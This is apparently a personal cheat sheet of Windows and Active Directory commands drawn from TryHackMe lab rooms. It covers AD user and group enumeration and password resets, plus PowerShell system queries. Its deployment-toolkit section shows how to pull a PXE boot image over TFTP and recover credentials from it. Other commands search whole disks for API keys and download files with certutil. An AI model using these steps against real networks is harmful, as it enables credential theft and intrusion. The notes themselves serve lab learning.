# Windows Commands

* [Active Directory](#active-directory)
* [Microsoft Deployment Toolkit](#microsoft-deployment-toolkit)
* [PowerShell](#powershell)


## Active Directory
Set password:
```
Set-ADAccountPassword [USERNAME] -Reset -NewPassword (Read-Host -AsSecureString -Prompt 'New Password') -Verbose
```
Another way:
```
Set-ADAccountPassword -Identity [USERNAME] -Server [DOMAIN] -OldPassword (ConvertTo-SecureString -AsPlaintext "old" -force) -NewPassword (ConvertTo-SecureString -AsPlainText "new" -Force)
```
And Another way:
```
$Password = ConvertTo-SecureString "[PASSWORD]" -AsPlainText -Force
```
```
Set-ADAccountPassword -Identity "[USERNAME]" -Reset -NewPassword $Password
```
  
Force password reset on next login:
```
Set-ADUser -ChangePasswordAtLogon $true -Identity [USERNAME] -Verbose
```
Force group policy update:
```
gpupdate /force
```
List all users in the AD domain:
```
net user /domain
```
List info on a specific user:
```
net user "[USERNAME]" /domain
```
List Groups in the AD domain:
```
net group /domain
```
List info on a specific group:
```
net group "[GROUP-NAME]" /domain
```
Enumerate password policy:
```
net accounts /domain
```
Enumerate AD Users:
```
Get-ADUser -Identity [USERNAME] -Server [DOMAIN] -Properties *
```
Example:
```
Get-ADUser -Identity gordon.stevens -Server za.tryhackme.com -Properties *
```
Pretty Output:
```
Get-ADUser -Filter 'Name -like "*stevens"' -Server za.tryhackme.com | Format-Table Name,SamAccountName -A
```
Another Way:
```
Get-ADUser -Filter * -Properties * | select Name,SamAccountName,Description
```
Enumerate AD Groups:
```
Get-ADGroup -Identity [GROUP-NAME] -Server [DOMAIN]
```
Example:
```
Get-ADGroup -Identity Administrators -Server za.tryhackme.com
```
Enumerate group membership:
```
Get-ADGroupMember -Identity [GROUP-NAME] -Server [DOMAIN]
```
Example:
```
Get-ADGroupMember -Identity Administrators -Server za.tryhackme.com
```
Generic search for AD objects:
```
Get-ADObject [OPTIONS]
```
Example:
```
Get-ADObject -Filter 'whenChanged -gt $ChangeDate' -includeDeletedObjects -Server za.tryhackme.com
```
Enumerate accounts that have a bad password count greater than 0:
```
Get-ADObject -Filter 'badPwdCount -gt 0' -Server [DOMAIN]
```
Get info about a specific domain:
```
Get-ADDomain -Server [DOMAIN]
```
* More info about the net command can be found here: https://learn.microsoft.com/en-us/troubleshoot/windows-server/networking/net-commands-on-operating-systems
* More info about cmdlets can be found here: https://learn.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps

************************************
## Microsoft Deployment Toolkit

Download BDC file via TFTP:
```
tftp -i [TARGET-IP] GET "\Tmp\[FILE-PATH]" conf.bcd
```

Recover the locations of the PXE boot images from the BCD file:
```
powershell -executionpolicy bypass
```
```
Import-Module .\PowerPXE.ps1
```
```
$BCDFile = "conf.bcd"
```
```
Get-WimFile -bcdFile $BCDFile
```
Download Image:
```
tftp -i [TARGET-IP] GET "[PXE-BOOT-IMAGE-LOCATION]" pxeboot.wim
```
Recovering Credentials from a PXE Boot Image:
```
Get-FindCredentials -WimFile pxeboot.wim
```

* Credit: https://tryhackme.com/room/breachingad

************************************
## PowerShell

Get Service Names
```
powershell -c "Get-Service"
```
Find location of a file:
```
Get-ChildItem -Path C:\ -Include *[FILENAME]* -File -Recurse -ErrorAction SilentlyContinue
```
Example:
```
Get-ChildItem -Path C:\ -Include *interesting-file.txt* -File -Recurse -ErrorAction SilentlyContinue
```
Get file hash:
```
Get-FileHash -Path "[FILE-PATH]" -Algorithm [ALGORITHM]
```
Example:
```
Get-FileHash -Path "C:\Program Files\interesting-file.txt.txt" -Algorithm MD5
```
Base64 decode a file:
```
certutil -decode "[FILE-PATH]" [OUTPUT-FILE]
```
Example:
```
certutil -decode "C:\Users\Administrator\Desktop\b64.txt" output.txt
```
Get users on local machine:
```
Get-LocalUser
```
Get users that do not require a password:
```
Get-LocalUser | Where-Object -Property PasswordRequired -Match false
```
List local machine groups:
```
Get-LocalGroup
```
Get IP Address:
```
Get-NetIPAddress
```
List listening ports:
```
Get-NetTCPConnection | Where-Object -Property State -Match Listen
```
List recent updates on the system:
```
Get-Hotfix
```
List backup files:
```
Get-ChildItem -Path C:\ -Include *.bak* -File -Recurse -ErrorAction SilentlyContinue
```
List files containing API_KEY: *WARNING: THIS PRODUCES A LOT OF OUTPUT AND TAKES A WHILE TO PROCESS*  
*The file path(s) will be listed at the end above the error output*
```
Get-ChildItem C:\* -Recurse | Select-String -pattern API_KEY
```
List all running processes:
```
Get-Process
```
List ACL for file path:
```
Get-Acl [FILE-PATH]
```
Download file from simple web server:
```
certutil -urlcache -f [FILE-PATH-ON-HTTP-SERVER] [OUT-FILE]
```

************************************


## References
* https://tryhackme.com/room/breachingad
* https://tryhackme.com/room/adenumeration
* https://tryhackme.com/room/powershell
